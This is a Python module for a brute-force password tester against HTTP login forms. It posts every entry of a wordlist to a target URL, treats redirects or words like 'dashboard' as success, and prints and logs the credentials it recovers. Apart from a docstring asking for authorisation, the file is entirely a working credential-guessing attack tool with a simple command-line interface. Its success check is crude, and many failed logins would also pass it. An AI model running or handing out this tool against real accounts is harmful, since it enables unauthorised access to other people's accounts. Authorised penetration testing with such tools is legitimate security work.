"""
Brute-force login tester (HTTP form example)

This module attempts authentication against a simple HTTP login form using
passwords from a wordlist file.

Important:
- Only use this script on systems you own or where you have explicit written permission.
- Adjust `user_field` and `pass_field` to match the target form field names.
- The success detection is heuristic: by default it treats redirects (3xx) or
  presence of a success keyword (e.g., "logout", "dashboard") as success.
"""

from typing import Optional, Tuple
from pathlib import Path
from datetime import datetime
import requests

# Optional project logger. If src/logger.py provides log_entry(text: str),
# it will be used to write findings to results/scan_results.txt
try:
    from logger import log_entry  # type: ignore
except Exception:
    log_entry = None  # type: ignore

DEFAULT_TIMEOUT = 10


def _timestamp() -> str:
    return datetime.utcnow().isoformat(timespec="seconds") + "Z"


def load_passwords(path: Path) -> list:
    """Load non-empty lines from a password file."""
    if not path.exists():
        raise FileNotFoundError(f"Password file not found: {path}")
    with path.open("r", encoding="utf-8", errors="ignore") as fh:
        lines = [line.strip() for line in fh if line.strip()]
    return lines


def try_login(
    url: str,
    username: str,
    password: str,
    user_field: str = "username",
    pass_field: str = "password",
    timeout: int = DEFAULT_TIMEOUT,
) -> bool:
    """
    Attempt one login request. Returns True when it looks like authentication succeeded.

    Heuristics:
      - HTTP redirect (3xx) is considered a likely success.
      - HTTP 200 containing "logout" or "dashboard" (case-insensitive) is considered success.
      - This is intentionally conservative; adapt the checks for your target.
    """
    data = {user_field: username, pass_field: password}
    try:
        r = requests.post(url, data=data, timeout=timeout, allow_redirects=True)
    except requests.RequestException:
        return False

    # Redirects often indicate successful login
    if 300 <= r.status_code < 400:
        return True

    # Heuristic success keywords in page body
    body = (r.text or "").lower()
    if "logout" in body or "dashboard" in body or "welcome" in body:
        return True

    return False


def run_bruteforce(
    login_url: str,
    username: str,
    passwords_path: str,
    user_field: str = "username",
    pass_field: str = "password",
    success_keyword: Optional[str] = None,
) -> Optional[Tuple[str, str]]:
    """
    Run a brute-force attempt using the provided wordlist.

    Returns:
      - (username, password) tuple on success
      - None if no password found
    """
    pw_path = Path(passwords_path)
    try:
        passwords = load_passwords(pw_path)
    except FileNotFoundError as e:
        print(e)
        return None

    print(f"Starting brute-force against {login_url} for user '{username}' ({len(passwords)} passwords).")

    for pw in passwords:
        success = try_login(login_url, username, pw, user_field=user_field, pass_field=pass_field)
        if not success and success_keyword:
            # If custom success keyword provided, do a targeted check
            try:
                r = requests.post(login_url, data={user_field: username, pass_field: pw}, timeout=DEFAULT_TIMEOUT)
                if success_keyword.lower() in (r.text or "").lower():
                    success = True
            except requests.RequestException:
                success = False

        if success:
            message = f"BRUTE_FORCE_SUCCESS {username} {pw} {login_url}"
            print(f"SUCCESS: {username} / {pw}")
            if log_entry:
                log_entry(message)
            return username, pw

        # Print progress line (kept minimal to avoid flooding)
        print(f"Attempt failed: {pw}")

    print("Brute-force completed. No valid credentials found.")
    if log_entry:
        log_entry(f"BRUTE_FORCE_COMPLETE no valid password found for {username} on {login_url}")
    return None


if __name__ == "__main__":
    # Simple CLI usage: run from project root so relative paths and logger work.
    login_url = input("Enter login URL (e.g. http://example.com/login): ").strip()
    username = input("Enter username to test: ").strip()
    pw_file = input("Path to password file (default: passwords.txt): ").strip() or "passwords.txt"
    user_field = input("Form username field name (default 'username'): ").strip() or "username"
    pass_field = input("Form password field name (default 'password'): ").strip() or "password"

    result = run_bruteforce(login_url, username, pw_file, user_field=user_field, pass_field=pass_field)
    if result:
        user, found_pw = result
        print(f"Found credentials: {user} : {found_pw}")
